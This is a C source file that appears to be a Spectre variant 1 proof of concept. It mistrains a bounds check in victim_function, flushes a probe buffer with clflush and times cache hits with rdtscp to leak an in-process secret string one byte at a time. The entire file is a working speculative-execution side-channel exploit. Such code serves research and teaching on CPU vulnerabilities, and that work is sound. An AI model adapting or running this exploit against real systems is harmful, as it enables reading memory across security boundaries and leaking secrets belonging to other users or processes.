#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>

#define CACHE_LINE_SIZE 512 
#define BUFF_SIZE 256 

unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[16] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t unused2[64];

uint8_t buffer[BUFF_SIZE * CACHE_LINE_SIZE];

char * secret = "You can't read this";

uint8_t temp = 0;

void flush_all(){
	for (int i = 0; i < BUFF_SIZE; i++) _mm_clflush(&buffer[i * CACHE_LINE_SIZE]);
}

void victim_function(size_t to_read) {
	if (to_read < array1_size) {
		temp &= buffer[CACHE_LINE_SIZE * array1[to_read]];
	}
}

uint64_t measure (volatile uint8_t  * addr) {
	register uint64_t start, end;
	unsigned int junk = 0;
	
	start = __rdtscp(&junk);
	junk = *addr;
	end = __rdtscp(&junk);
		
	return end - start;

}

char readByte(int cache_threshold, size_t target_x) {
	static int results[256];
	register uint64_t start, end;
	unsigned int junk = 0;
	size_t x;
	
	for (int i = 0; i < 256; i++) results[i] = 0;
	
	for (int tries = 0; tries < 1000; tries++) {
		
			flush_all();	

			size_t training_x = tries % array1_size;
			

			for (int j = 29; j >= 0; j--) {
				
				_mm_clflush( & array1_size);
				for (volatile int z = 0; z < 100; z++) {}
				
				/* Bit magic to set x=training_x if j%6!=0 otherwise target_x */
				x = ((j % 6) - 1) & ~0xFFFF;
				x = (x | (x >> 16));
				x = training_x ^ (x & (target_x ^ training_x));

				victim_function(x);

			}		


			for (int i = 0; i<256; i++) {

				int mix_i = ((i * 167) + 13) & 255;
				uint8_t * addr = &buffer[mix_i * CACHE_LINE_SIZE];	
	
				uint64_t time = measure(addr);		
		
				// int time = measure(addr);
				if ((int)time <= cache_threshold && mix_i != array1[tries % array1_size]) {
					results[mix_i]++;
				}

			}
	}

	char best = -1;
	int best_score = -1;
	for (int i = 0; i < 256; i++) {
		if (results[i] > best_score) {
			best = i;
			best_score = results[i];
		}
	}

	results[0] ^= junk;
	return best;

}

int main(int argc, char ** argv) {
	
	for (int i = 0; i < (int)sizeof(buffer); i++) {
    buffer[i] = 1;
  }
	
	int secret_size = 19;
	int cache_threshold = 80;

	if (argc >= 2) {
    sscanf(argv[1], "%d", &cache_threshold);
  }

	size_t offset = (size_t) (secret - (char *) array1);

	printf("Cache threshold is set to %d.\n", cache_threshold);
	for (int i = 0; i<secret_size; i++) {
		
		char result = readByte(cache_threshold, offset + i);
		printf("Character %d: %c (ASCII %d)\n", i, result, (int) result);

	}

}
